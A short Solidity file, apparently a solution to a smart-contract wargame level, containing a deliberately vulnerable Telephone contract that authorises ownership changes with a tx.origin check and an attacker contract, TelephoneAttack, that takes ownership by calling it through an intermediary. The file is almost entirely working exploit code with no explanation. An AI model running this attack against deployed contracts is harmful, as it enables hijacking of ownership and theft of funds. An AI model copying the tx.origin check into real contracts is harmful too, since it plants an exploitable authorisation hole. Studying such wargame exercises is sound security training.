// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Ataque
contract TelephoneAttack {
    Telephone private immutable target;

    constructor(address _target) {
        target = Telephone(_target);
    }

    function hack(address newOwner) public {
        target.changeOwner(newOwner);
    }
}

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
